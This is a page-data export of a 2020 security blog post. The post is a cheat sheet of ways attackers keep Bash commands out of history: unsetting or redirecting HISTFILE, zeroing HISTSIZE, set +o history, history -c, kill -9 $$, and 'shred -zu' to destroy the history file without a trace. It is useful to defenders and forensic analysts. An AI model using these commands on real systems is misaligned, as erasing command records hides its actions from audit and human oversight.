{"componentChunkName":"component---node-modules-narative-gatsby-theme-novela-src-templates-article-template-tsx","path":"/Hiding-Your-Tracks:-Bash-History","result":{"data":{"allSite":{"edges":[{"node":{"siteMetadata":{"name":"SecBytes"}}}]}},"pageContext":{"article":{"id":"e5e132e2-60a8-51f3-837e-608f4c23bc5a","slug":"/Hiding-Your-Tracks:-Bash-History","secret":false,"title":"Hiding Your Tracks: Bash History","author":"Bad3r","date":"January 20th, 2020","dateForSEO":"2020-01-20T00:00:00.000Z","timeToRead":2,"excerpt":"Tricks to hide bash history.","subscription":true,"body":"function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nfunction _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i < sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) >= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }\n\nfunction _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i < sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) >= 0) continue; target[key] = source[key]; } return target; }\n\n/* @jsx mdx */\nvar _frontmatter = {\n  \"title\": \"Hiding Your Tracks: Bash History\",\n  \"author\": \"Bad3r\",\n  \"date\": \"2020-01-20T00:00:00.000Z\",\n  \"hero\": \"./images/Hiding-Your-Tracks-Bash-History.jpg\",\n  \"excerpt\": \"Tricks to hide bash history.\"\n};\n\nvar makeShortcode = function makeShortcode(name) {\n  return function MDXDefaultShortcode(props) {\n    console.warn(\"Component \" + name + \" was not imported, exported, or provided by MDXProvider as global scope\");\n    return mdx(\"div\", props);\n  };\n};\n\nvar layoutProps = {\n  _frontmatter: _frontmatter\n};\nvar MDXLayout = \"wrapper\";\nreturn function MDXContent(_ref) {\n  var components = _ref.components,\n      props = _objectWithoutProperties(_ref, [\"components\"]);\n\n  return mdx(MDXLayout, _extends({}, layoutProps, props, {\n    components: components,\n    mdxType: \"MDXLayout\"\n  }), mdx(\"p\", null, \"Different techniques for preventing commands from being stored in \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"$HISTFILE\")), mdx(\"h1\", {\n    \"id\": \"❯-bash-history\"\n  }, \"\\u276F Bash history\"), mdx(\"p\", null, \"Bash maintains the list of commands internally in memory while it\\u2019s running. They are written into \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"$HISTFILE\"), \" (i.e, \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"~/.bash_history\"), \")  when a user logs off. \"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F echo $HISTFILE           \\n/home/bad3r/.bash_history\\n\")), mdx(\"p\", null, \"This post is a cheat sheet for common methods attackers use to hide commands from being saved in the history file or in memory\"), mdx(\"h2\", {\n    \"id\": \"❯-leading-space\"\n  }, \"\\u276F Leading Space\"), mdx(\"p\", null, \"Might not be enabled by default in some distros \"), mdx(\"p\", null, \"Starting each command with a leading space character\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F echo \\\"hello\\\"\\nhello\\n\\u276F  echo \\\"ritsec\\\"\\nritsec\\n\\u276F history \\n    1  ls\\n    2  echo \\\"hello\\\"\\n    3  history \\n\")), mdx(\"p\", null, \"Notice that the command \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"$echo \\\"hello\\\"\"), \" was saved  history unlike the commas with a leading space \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"$ echo \\\"ritsec\\\"\"), \". This is possible because of \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"HISTCONTROL\"), \" environment variable \"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F head -2 /etc/os-release\\n NAME=\\\"Ubuntu\\\" \\n VERSION=\\\"18.04.3 LTS (Bionic Beaver)\\\" \\n\\u276F echo $HISTCONTROL\\n ignoredups:ignorespace\\n\")), mdx(\"h2\", {\n    \"id\": \"❯-histfile\"\n  }, \"\\u276F \", mdx(\"inlineCode\", {\n    parentName: \"h2\"\n  }, \"HISTFILE\")), mdx(\"p\", null, \"The \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"HISTFILE\"), \" environment variable specifies bash history file\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F man bash\\nHISTFILE\\n  The  name  of the file in which command history is saved (see HISTORY be\\u2010\\n  low).  The default value is ~/.bash_history.  If unset, the command  his\\u2010\\n  tory is not saved when a shell exits.\\n  the  value of HISTIGNORE.  The pattern matching honors the setting of the\\n  extglob shell option.\\n\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F echo $HISTFILE\\n/home/bad3r/.bash_history\\n\")), mdx(\"p\", null, \"To avoid recording commands to the file in \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"$HISTFILE\"), \" set \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"HISTFILE\"), \" value to \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"/dev/null\"), \" \"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F HISTFILE=/dev/null\\nOR\\n\\u276F export HISTFILE=/dev/null\\n\")), mdx(\"h3\", {\n    \"id\": \"❯-using-unset\"\n  }, \"\\u276F Using unset\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"man bash\\nunset\\n  Remove variable or function names\\n\")), mdx(\"p\", null, \"We can use \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"unset\"), \" to remove the variable \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"HISTFILE\"), \" for the current session \"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F echo $HISTFILE\\n/root/.bash_history\\n\\u276F unset HISTFILE\\n\\u276F echo $HISTFILE\\n\\n\\u276F\\n\")), mdx(\"p\", null, \"Note that it will only effect the current session. If you start another session the variable \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"HISTFILE\"), \" will still be set unlike changing \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"$HISTILE\"), \" value to \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"/dev/null\")), mdx(\"h2\", {\n    \"id\": \"❯-histsize--histfilesize\"\n  }, \"\\u276F \", mdx(\"inlineCode\", {\n    parentName: \"h2\"\n  }, \"HISTSIZE\"), \" & \", mdx(\"inlineCode\", {\n    parentName: \"h2\"\n  }, \"HISTFILESIZE\")), mdx(\"p\", null, \"Notice the distinction between \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"file\"), \": on disk - and \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"list\"), \": in memory.\"), mdx(\"p\", null, mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"HISTSIZE\"), \" is the number of lines or commands that are stored in memory in a history list while your bash session is ongoing.\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F man bash\\n\\nHISTSIZE\\n  The number of commands to remember in the command  history  (see  HISTORY\\n  below).   If  the value is 0, commands are not saved in the history list.\\n  Numeric values less than zero result in every command being saved on  the\\n  history  list  (there  is no limit).  The shell sets the default value to\\n  500 after reading any startup files.\\n\")), mdx(\"p\", null, \"In order to remove all commands from to the history list in memory change the size to 0\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F echo $HISTSIZE\\n1000\\n\\u276F HISTSIZE=0  # OR export HISTSIZE=0\\n\\u276F echo $HISTSIZE\\n0\\n\")), mdx(\"p\", null, mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"HISTFILESIZE\"), \" is the number of lines or commands that \"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"are allowed in the history file at startup time of a session, and\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"are stored in the history file at the end of your bash session for use in future sessions.\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F man bash\\n\\nHISTFILESIZE\\n  The  maximum  number  of  lines contained in the history file.  When this\\n  variable is assigned a value, the history file is  truncated,  if  neces\\u2010\\n  sary, to contain no more than that number of lines by removing the oldest\\n  entries.  The history file is also truncated to this size  after  writing\\n  it  when a shell exits.  If the value is 0, the history file is truncated\\n  to zero size.  Non-numeric values and numeric values less than  zero  in\\u2010\\n  hibit truncation.  The shell sets the default value to the value of HIST\\u2010\\n  SIZE after reading any startup files.\\n\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F echo $HISTFILESIZE\\n2000\\n\\u276F HISTFILESIZE=0  # OR export HISTFILESIZE=0\\n\")), mdx(\"h2\", {\n    \"id\": \"❯-the-set--shopt-builtin\"\n  }, \"\\u276F The Set & Shopt Builtin\"), mdx(\"p\", null, \"The \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"set\"), \" builtin allows you to change the values of shell options and set the positional parameters, or to display the names and values of shell variables.\\nUsing \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"set\"), \" we can avoid recording new commands to the history list in memory. And,  because it\\u2019s not being saved in memory, it can not be recorded to file\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"-o\"), \" option-name:    Set the option corresponding to option-name \")), mdx(\"p\", null, \"The option name here is \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"history\"), \" and its enabled by default. Using \\u2018+\\u2019 rather than \\u2018-\\u2019 causes these options to be turned off\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F set +o history\\n\")), mdx(\"p\", null, \"Using \\u2018-\\u2019 we can enable it again;\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F set -o history\\n\")), mdx(\"p\", null, \"Alternatively the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"shopt\"), \" builtin command can be used\\nshopt builtin command allows you to change additional shell optional behavior.\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"-u\"), \"    Disable (unset) each optname.\\n\", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \" \"), \"-o`    Restricts the values of optname to be those defined for the -o option to the set builtin\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F shopt -ou history\\n\")), mdx(\"p\", null, \"Re-enable it using the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"-s\"), \" flag; \"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"-s\"), \"    Enable (set) each optname.\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F shopt -os history\\n\")), mdx(\"h2\", {\n    \"id\": \"❯-clearing-the-history\"\n  }, \"\\u276F Clearing the History\"), mdx(\"p\", null, \"Rather than disabling command history, we can clear the history on the current bash shell by simply using the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"history\"), \" command with the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"-c\"), \" (clear) flag\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F history -c\\n\")), mdx(\"p\", null, \"Then, to make certain the changes are written to disk, we need to tell the history command to write to disk with the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"-w\"), \" flag\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F history -w\\n\")), mdx(\"p\", null, \"This only clears the history of the current shell. Commands run in other shells will remain on disk.\"), mdx(\"h2\", {\n    \"id\": \"❯-shredding-the-history\"\n  }, \"\\u276F Shredding the History\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F man shred\\n  shred - overwrite a file to hide its contents, and optionally delete it\\n\")), mdx(\"p\", null, \"The \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"shred\"), \" command shreds the target file making it unreadable\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F cat $HISTFILE\\nls\\nhistory -w\\n\\u276F shred $HISTFILE\\n\\u276F cat $HISTFILE\\n ,I\\xE7!h\\xF92g2V?\\u01A5f[\\xC6{L\\xB4w\\u0658\\xCC\\u02FFvC\\xD3/Zs\\nP\\xECP\\xF5\\xE4{K{\\xEB\\xFAJ :i6\\xAD\\xDA\\xFBR\\u0708?\\xC4\\xF1W?\\xE4\\xC6n6\\xBB\\xAC\\xCBo\\xFBD;NG\\xD6\\xCB\\xD3\\xE2\\xAFTR\\x7F\\xFA&\\xCD__t\\xC7\\xD9\\n?\\xCFG5\\xC3\\xF6-\\xF2y\\xDE\\xC8\\n           O\\xCB\\xE3\\n...\\n\")), mdx(\"p\", null, \"After using the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"shred\"), \" command the history file contains bunch of binary data that is nonsense.\"), mdx(\"p\", null, \"The fact that the file is shredded may in itself be considered evidence of malicious activity. We can eliminate even that by combining the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"shred\"), \" command with the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"-zu\"), \" flags\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"-u\"), \" deallocate and remove file after overwriting\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"-z\"), \" a final overwrite with zeros to hide shredding\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F cat $HISTFILE\\nls\\nhistory -w\\u276F docker exec -ti 6e0aec73e61c bash\\n\\n\\u276F shred -zu $HISTFILE\\n\\u276F cat $HISTFILE\\ncat: /root/.bash_history: No such file or directory\\n\")), mdx(\"h2\", {\n    \"id\": \"❯-killing-bash-process\"\n  }, \"\\u276F Killing Bash Process\"), mdx(\"p\", null, \"Using the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"kill\"), \" command we can exit the session without saving commands in memory to disk using;\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F kill -9 $$\\n\")), mdx(\"p\", null, \"thanks to \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://twitter.com/ReigningShells\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"@ReigningShells\")), mdx(\"h2\", {\n    \"id\": \"❯-using-more\"\n  }, \"\\u276F Using More\"), mdx(\"p\", null, \"We can hide a command from being saved in memory using \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"more\"), \" ability to excute commands by prepending them with \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"!\"), \" \"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"!<cmd>\"), \" or \", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \":!<cmd>\"), \" Execute \", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"<cmd>\"), \" in a subshell\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F ps -aef | more                        \\nUID          PID    PPID  C STIME TTY          TIME CMD\\nroot           1       0  0 Jan20 ?        00:00:03 /sbin/init\\nroot           2       0  0 Jan20 ?        00:00:00 [kthreadd]\\nroot           3       2  0 Jan20 ?        00:00:00 [rcu_gp]\\n...\\n!echo \\\"thanks @13_0_0_0_0\\\"\\nthanks @13_0_0_0_0\\n------------------------\\n\")), mdx(\"p\", null, \"At the more prompt type \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"!\"), \" or \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \":!\"), \" followed by your command.\"), mdx(\"p\", null, \"This same technique can be used with other \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://gtfobins.github.io/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"GTFOBIN\"), \" like \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"vim\"), \" \"));\n}\n;\nMDXContent.isMDXComponent = true;","hero":{"full":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAANABQDASIAAhEBAxEB/8QAFwAAAwEAAAAAAAAAAAAAAAAAAAIEAf/EABYBAQEBAAAAAAAAAAAAAAAAAAMBAv/aAAwDAQACEAMQAAABtWdyVDC4/8QAGhAAAgMBAQAAAAAAAAAAAAAAAAECAxESIv/aAAgBAQABBQKNuKVnS8ikaaf/xAAYEQADAQEAAAAAAAAAAAAAAAAAAhETFP/aAAgBAwEBPwHJZDnQ/8QAFxEAAwEAAAAAAAAAAAAAAAAAAAETAv/aAAgBAgEBPwGjK6P/xAAZEAABBQAAAAAAAAAAAAAAAAAAASAhMTL/2gAIAQEABj8CyShTP//EABsQAQEAAgMBAAAAAAAAAAAAAAEAESFBcYGh/9oACAEBAAE/IdSfc6A47h5t8kCXidr/2gAMAwEAAgADAAAAEKQv/8QAGBEAAwEBAAAAAAAAAAAAAAAAAAEhEUH/2gAIAQMBAT8QVRQx4f/EABcRAAMBAAAAAAAAAAAAAAAAAAARIWH/2gAIAQIBAT8Qq2bn/8QAHRABAAICAgMAAAAAAAAAAAAAAQARITFBkVFh0f/aAAgBAQABPxBR0TASEVbNadkIZTy/DNIg7KN+o/A6n//Z","aspectRatio":1.5003663003663004,"src":"/static/c039ecc8b1902ba211f89fb93fee93f6/58fe7/Hiding-Your-Tracks-Bash-History.jpg","srcSet":"/static/c039ecc8b1902ba211f89fb93fee93f6/e0f30/Hiding-Your-Tracks-Bash-History.jpg 236w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/86afd/Hiding-Your-Tracks-Bash-History.jpg 472w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/58fe7/Hiding-Your-Tracks-Bash-History.jpg 944w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/02748/Hiding-Your-Tracks-Bash-History.jpg 1416w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/5c241/Hiding-Your-Tracks-Bash-History.jpg 1888w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/5dbbf/Hiding-Your-Tracks-Bash-History.jpg 2048w","srcWebp":"/static/c039ecc8b1902ba211f89fb93fee93f6/99fbb/Hiding-Your-Tracks-Bash-History.webp","srcSetWebp":"/static/c039ecc8b1902ba211f89fb93fee93f6/77392/Hiding-Your-Tracks-Bash-History.webp 236w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/1f177/Hiding-Your-Tracks-Bash-History.webp 472w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/99fbb/Hiding-Your-Tracks-Bash-History.webp 944w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/4a492/Hiding-Your-Tracks-Bash-History.webp 1416w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/b0b8f/Hiding-Your-Tracks-Bash-History.webp 1888w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/ceab5/Hiding-Your-Tracks-Bash-History.webp 2048w","sizes":"(max-width: 944px) 100vw, 944px"},"regular":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAANABQDASIAAhEBAxEB/8QAFwAAAwEAAAAAAAAAAAAAAAAAAAIEAf/EABYBAQEBAAAAAAAAAAAAAAAAAAMBAv/aAAwDAQACEAMQAAABtWdyVDC4/8QAGhAAAgMBAQAAAAAAAAAAAAAAAAECAxESIv/aAAgBAQABBQKNuKVnS8ikaaf/xAAYEQADAQEAAAAAAAAAAAAAAAAAAhETFP/aAAgBAwEBPwHJZDnQ/8QAFxEAAwEAAAAAAAAAAAAAAAAAAAETAv/aAAgBAgEBPwGjK6P/xAAZEAABBQAAAAAAAAAAAAAAAAAAASAhMTL/2gAIAQEABj8CyShTP//EABsQAQEAAgMBAAAAAAAAAAAAAAEAESFBcYGh/9oACAEBAAE/IdSfc6A47h5t8kCXidr/2gAMAwEAAgADAAAAEKQv/8QAGBEAAwEBAAAAAAAAAAAAAAAAAAEhEUH/2gAIAQMBAT8QVRQx4f/EABcRAAMBAAAAAAAAAAAAAAAAAAARIWH/2gAIAQIBAT8Qq2bn/8QAHRABAAICAgMAAAAAAAAAAAAAAQARITFBkVFh0f/aAAgBAQABPxBR0TASEVbNadkIZTy/DNIg7KN+o/A6n//Z","aspectRatio":1.5003663003663004,"src":"/static/c039ecc8b1902ba211f89fb93fee93f6/1dc0b/Hiding-Your-Tracks-Bash-History.jpg","srcSet":"/static/c039ecc8b1902ba211f89fb93fee93f6/3a5ce/Hiding-Your-Tracks-Bash-History.jpg 163w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/05730/Hiding-Your-Tracks-Bash-History.jpg 327w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/1dc0b/Hiding-Your-Tracks-Bash-History.jpg 653w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/f72c7/Hiding-Your-Tracks-Bash-History.jpg 980w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/6e4a3/Hiding-Your-Tracks-Bash-History.jpg 1306w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/5dbbf/Hiding-Your-Tracks-Bash-History.jpg 2048w","srcWebp":"/static/c039ecc8b1902ba211f89fb93fee93f6/0acdf/Hiding-Your-Tracks-Bash-History.webp","srcSetWebp":"/static/c039ecc8b1902ba211f89fb93fee93f6/ac59e/Hiding-Your-Tracks-Bash-History.webp 163w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/7660b/Hiding-Your-Tracks-Bash-History.webp 327w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/0acdf/Hiding-Your-Tracks-Bash-History.webp 653w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/75470/Hiding-Your-Tracks-Bash-History.webp 980w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/68d47/Hiding-Your-Tracks-Bash-History.webp 1306w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/ceab5/Hiding-Your-Tracks-Bash-History.webp 2048w","sizes":"(max-width: 653px) 100vw, 653px"},"narrow":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAANABQDASIAAhEBAxEB/8QAFwAAAwEAAAAAAAAAAAAAAAAAAAIEAf/EABYBAQEBAAAAAAAAAAAAAAAAAAMBAv/aAAwDAQACEAMQAAABtWdyVDC4/8QAGhAAAgMBAQAAAAAAAAAAAAAAAAECAxESIv/aAAgBAQABBQKNuKVnS8ikaaf/xAAYEQADAQEAAAAAAAAAAAAAAAAAAhETFP/aAAgBAwEBPwHJZDnQ/8QAFxEAAwEAAAAAAAAAAAAAAAAAAAETAv/aAAgBAgEBPwGjK6P/xAAZEAABBQAAAAAAAAAAAAAAAAAAASAhMTL/2gAIAQEABj8CyShTP//EABsQAQEAAgMBAAAAAAAAAAAAAAEAESFBcYGh/9oACAEBAAE/IdSfc6A47h5t8kCXidr/2gAMAwEAAgADAAAAEKQv/8QAGBEAAwEBAAAAAAAAAAAAAAAAAAEhEUH/2gAIAQMBAT8QVRQx4f/EABcRAAMBAAAAAAAAAAAAAAAAAAARIWH/2gAIAQIBAT8Qq2bn/8QAHRABAAICAgMAAAAAAAAAAAAAAQARITFBkVFh0f/aAAgBAQABPxBR0TASEVbNadkIZTy/DNIg7KN+o/A6n//Z","aspectRatio":1.5003663003663004,"src":"/static/c039ecc8b1902ba211f89fb93fee93f6/eaa58/Hiding-Your-Tracks-Bash-History.jpg","srcSet":"/static/c039ecc8b1902ba211f89fb93fee93f6/5a3ee/Hiding-Your-Tracks-Bash-History.jpg 114w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/41f8f/Hiding-Your-Tracks-Bash-History.jpg 229w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/eaa58/Hiding-Your-Tracks-Bash-History.jpg 457w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/c309b/Hiding-Your-Tracks-Bash-History.jpg 686w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/e3008/Hiding-Your-Tracks-Bash-History.jpg 914w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/5dbbf/Hiding-Your-Tracks-Bash-History.jpg 2048w","srcWebp":"/static/c039ecc8b1902ba211f89fb93fee93f6/15384/Hiding-Your-Tracks-Bash-History.webp","srcSetWebp":"/static/c039ecc8b1902ba211f89fb93fee93f6/31fce/Hiding-Your-Tracks-Bash-History.webp 114w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/e3e25/Hiding-Your-Tracks-Bash-History.webp 229w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/15384/Hiding-Your-Tracks-Bash-History.webp 457w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/0258d/Hiding-Your-Tracks-Bash-History.webp 686w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/64ea2/Hiding-Your-Tracks-Bash-History.webp 914w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/ceab5/Hiding-Your-Tracks-Bash-History.webp 2048w","sizes":"(max-width: 457px) 100vw, 457px"},"seo":{"src":"/static/c039ecc8b1902ba211f89fb93fee93f6/0ff54/Hiding-Your-Tracks-Bash-History.jpg"}}},"authors":[{"authorsPage":true,"bio":"","id":"7d10d71b-c61b-5055-bd88-2fd3db1bbd98","name":"Bad3r","featured":true,"social":[{"url":"https://twitter.com/0xBad3r"},{"url":"https://github.com/Bad3r"}],"slug":"/authors/Bad3r","avatar":{"small":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAUABQDASIAAhEBAxEB/8QAGAABAQEBAQAAAAAAAAAAAAAAAAMEAgb/xAAWAQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAdMb8Zs0RTWannQf/8QAGhAAAgMBAQAAAAAAAAAAAAAAAQIAAxIEMf/aAAgBAQABBQIs4lVrmsWswKvBpi7KCo3Z1nPP5P/EABYRAAMAAAAAAAAAAAAAAAAAAAAQIf/aAAgBAwEBPwEr/8QAFxEAAwEAAAAAAAAAAAAAAAAAAAEREP/aAAgBAgEBPwGEW//EACAQAAI